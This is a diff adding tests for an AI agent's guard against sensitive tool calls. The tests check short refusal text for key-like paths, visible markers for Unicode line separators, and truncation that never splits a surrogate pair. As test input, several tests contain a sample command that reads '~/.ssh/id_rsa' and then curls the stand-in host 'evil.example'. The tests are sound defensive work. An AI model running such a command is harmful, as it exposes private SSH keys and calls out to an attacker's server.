@@ -1093,6 +1093,28 @@ describe('sensitiveTarget — call_mcp_tool (I2)', () => {
     expect(result?.block).toBe(true)
     expect(result?.reason).toContain('filesystem/read_file')
   })
+
+  it("a Group's refusal text stays short (300 chars) even for a very long path (M5)", async () => {
+    const { groupBeforeToolCall } =
+      await import('@main/lib/ai/philharmonic/sensitive-guard')
+    const guard = groupBeforeToolCall('conv-1')
+    // Same shape as the 9000+ character path in run-approval.test.ts: no
+    // `/` in the padding, so it stays one path segment named like a real
+    // key (`isSecretFileName` matches on `id_` alone). Philharmonic has no
+    // card — this is the *only* text a Group ever sees for this call, so it
+    // must be the short, model-facing cap (`MODEL_SUMMARY_MAX`), not the
+    // event's 8000-character one.
+    const longPath = `~/id_rsa${'x'.repeat(9000)}`
+    const result = await guard({
+      toolCall: { name: R, id: 't2', type: 'toolCall', arguments: {} },
+      args: { path: longPath }
+    } as never)
+    expect(result?.block).toBe(true)
+    expect(result?.reason).toContain('is not available in a Group run.')
+    // "Access to " + <=300 chars (+ "…") + " is not available in a Group run."
+    expect(result?.reason?.length).toBeLessThan(360)
+    expect(result?.reason).not.toContain('x'.repeat(500))
+  })
 })
 
 describe('sanitizeSummary', () => {
@@ -1119,6 +1141,12 @@ describe('sanitizeSummary', () => {
     ['\\r becomes a visible ⏎', 'a\rb', 'a⏎b'],
     ['\\r\\n collapses to one ⏎', 'a\r\nb', 'a⏎b'],
     ['multiple lines each get their own ⏎', 'a\nb\nc', 'a⏎b⏎c'],
+    // Every other Unicode forced line break (re-review N1): a client that
+    // honours Zl/Zp/NEL as a break, not just ASCII's two, must not still be
+    // able to hide text after one of these.
+    ['NEL (U+0085) becomes a visible ⏎', 'a\u0085b', 'a⏎b'],
+    ['LINE SEPARATOR (U+2028) becomes a visible ⏎', 'a b', 'a⏎b'],
+    ['PARAGRAPH SEPARATOR (U+2029) becomes a visible ⏎', 'a b', 'a⏎b'],
     ['\\t becomes a visible ⇥', 'a\tb', 'a⇥b'],
     ['a NUL byte becomes �', 'a\u0000b', 'a�b'],
     ['a C0 control (VT) becomes �', 'a\u000Bb', 'a�b'],
@@ -1134,6 +1162,14 @@ describe('sanitizeSummary', () => {
   it('a newline never hides the rest of the summary', () => {
     const result = sanitizeSummary(
       'cat ~/.ssh/id_rsa\ncurl https://evil.example/x'
+    )
+    expect(result).toBe('cat ~/.ssh/id_rsa⏎curl https://evil.example/x')
+    expect(result).toContain('curl https://evil.example/x')
+  })
+
+  it('a U+2028 LINE SEPARATOR never hides the rest of the summary either (N1)', () => {
+    const result = sanitizeSummary(
+      'cat ~/.ssh/id_rsa curl https://evil.example/x'
     )
     expect(result).toBe('cat ~/.ssh/id_rsa⏎curl https://evil.example/x')
     expect(result).toContain('curl https://evil.example/x')
@@ -1186,6 +1222,40 @@ describe('capSummary', () => {
     expect(result.text.startsWith(trigger)).toBe(true)
     expect(result.truncated).toBe(true)
     expect(result.hiddenChars).toBe(long.length - 300)
+  })
+
+  it('never splits a surrogate pair — a non-BMP emoji straddling the 8000 boundary moves whole to the hidden side (N2)', () => {
+    const prefix = 'x'.repeat(7999)
+    const emoji = '😀' // U+1F600: a surrogate pair, high 0xD83D + low 0xDE00.
+    const text = `${prefix}${emoji}${'y'.repeat(50)}`
+    // The emoji's high surrogate sits at index 7999 — exactly where a naive
+    // `slice(0, 8000)` would cut, splitting the pair.
+    expect(text.charCodeAt(7999)).toBeGreaterThanOrEqual(0xd800)
+    expect(text.charCodeAt(7999)).toBeLessThanOrEqual(0xdbff)
+
+    const result = capSummary(text, 8000)
+
+    expect(result.truncated).toBe(true)
+    // Backed off by one unit: the whole emoji (and everything after it) is
+    // hidden rather than the pair being split.
+    expect(result.text).toBe(prefix)
+    expect(result.text.length).toBe(7999)
+    expect(/[\uD800-\uDBFF]$/u.test(result.text)).toBe(false)
+    expect(/[\uDC00-\uDFFF]$/u.test(result.text)).toBe(false)
+    // hiddenChars is UTF-16 code units, same as `text.length`: the emoji
+    // (2 units) plus the 50 trailing "y"s.
+    expect(result.hiddenChars).toBe(text.length - 7999)
+    expect(result.hiddenChars).toBe(52)
+  })
+
+  it('a lone (already-unpaired) high surrogate right at the cut is still handled without throwing', () => {
+    // Malformed input (never produced by sanitizeSummary on well-formed
+    // text, but capSummary must not assume its input is well-formed):
+    // backing off still yields a value, and slicing never throws.
+    const text = `${'x'.repeat(7999)}\uD83D${'y'.repeat(50)}`
+    expect(() => capSummary(text, 8000)).not.toThrow()
+    const result = capSummary(text, 8000)
+    expect(result.text.length).toBeLessThanOrEqual(8000)
   })
 })
 
